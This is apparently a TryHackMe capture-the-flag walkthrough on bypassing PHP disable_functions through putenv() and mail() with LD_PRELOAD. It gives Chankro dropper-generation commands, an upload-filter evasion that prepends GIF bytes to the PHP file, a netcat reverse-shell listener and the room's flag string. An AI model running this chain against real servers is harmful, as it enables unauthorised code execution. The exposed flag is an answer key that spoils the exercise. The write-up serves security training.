<img width="1852" height="315" alt="image" src="https://github.com/user-attachments/assets/5bb02956-e28e-43bb-87da-5d15c7bc82b4" />

What is a file upload vulnerability?

This vulnerability occurs in web applications where there is the possibility of uploading a file without being checked by a security system that curbs potential dangers. 

It allows an attacker to upload files with code (scripts such as .php, .aspx and more) and run them on the same server, more information in this room.

Why this room?

Among the typically applied measures is disabling dangerous functions that could execute operating system commands or start processes. Functions such as system() or shell_exec() are often disabled through PHP directives defined in the php.ini configuration file. Other functions, perhaps less known as dl() (which allows you to load a PHP extension dynamically), can go unnoticed by the system administrator and not be disabled. The usual thing in an intrusion test is to list which functions are enabled in case any have been forgotten.

One of the easiest techniques to implement and not very widespread is to abuse the mail() and putenv() functionalities. This technique is not new, it was already reported to PHP in 2008 by gat3way, but it still works to this day. Through the putenv() function, we can modify the environment variables, allowing us to assign the value we want to the variable LD_PRELOAD. Roughly LD_PRELOAD will allow us to pre-load a .so library before the rest of the libraries, so that if a program uses a function of a library (libc.so for example), it will execute the one in our library instead of the one it should. In this way, we can hijack or "hook" functions, modifying their behaviour at will.****

Chankro: tool to evade disable_functions and open_basedir

Through Chankro, we generate a PHP script that will act as a dropper, creating on the server a .so library and the binary (a meterpreter, for example) or bash script (reverse shell, for example) that we want to execute freely, and that will later call putenv() and mail() to launch the process.

Install tool:

git clone https://github.com/TarlogicSecurity/Chankro.git
cd Chankro
python2 chankro.py --help

python chankro.py --arch 64 --input c.sh --output tryhackme.php --path /var/www/html

--arch = Architecture of system victim 32 o 64.
--input = file with your payload to execute
--output = Name of the PHP file you are going to create; this is the file you will need to upload.
--path = It is necessary to specify the absolute path where our uploaded PHP file is located. For example, if our file is located in the uploads folder DOCUMENTROOT + uploads. 


Lets Go.... 

First use : Nmap to scanning network 

use command  : nmap -sV -A IP

i found 22 and 80 port open 

then i use gobuster to find directory 

<img width="1601" height="468" alt="image" src="https://github.com/user-attachments/assets/70ceb895-dfc1-4c2b-bb25-caaa52ed26f7" />

here i get to know the phpinfo.php file then i redirect on http://10.201.76.5/phpinfo.php this url and get to know so much information about lab

then i use to  Chankro thne i create one rev.php file

<img width="772" height="118" alt="image" src="https://github.com/user-attachments/assets/a237a6cd-c12b-441a-a759-ca4ff6d64418" />

then i generate thm1.php file using 
python2 chankro.py --arch 64 --input rev.sh --output thm1.php --path /var/www/html/fa5fba5f5a39d27d8bb7fe5f518e00db 

this command it generate thm1.php file 

i convert that file image file because server ony store image
<img width="1919" height="105" alt="image" src="https://github.com/user-attachments/assets/d7e3d0de-f0c1-45ff-9ced-efe4f61805bb" />

see i add some GIB text in starting

Now upload that file on http://10.201.76.5/cv.php

<img width="1745" height="636" alt="image" src="https://github.com/user-attachments/assets/d83536e1-c134-4d8c-9575-0b63f8bbf665" />


then i open http://10.201.76.5/uploads/


<img width="853" height="485" alt="image" src="https://github.com/user-attachments/assets/7098b866-8a35-49ec-8723-758bd0f59984" />

to user reverse shell i run first command

nc -lvp 1234

then click on thm1.php

then oprn revese shell terminal after some seconds you will see

<img width="904" height="786" alt="image" src="https://github.com/user-attachments/assets/2cf37455-c961-4cd7-8e08-d18f3a347615" />

then file flag.txt command using find / -name "flag.txt" 2>/dev/null   this commad

www-data@ubuntu:/var/www/html/fa5fba5f5a39d27d8bb7fe5f518e00db$ find / -name "flag.txt" 2>/dev/null   
<ml/fa5fba5f5a39d27d8bb7fe5f518e00db$ find / -name "flag.txt" 2>/dev/null    
/home/s4vi/flag.txt


then go on that file path you will and do cat flag.txt command you will get flag

cat flag.txt
thm{bypass_d1sable_functions_1n_php}
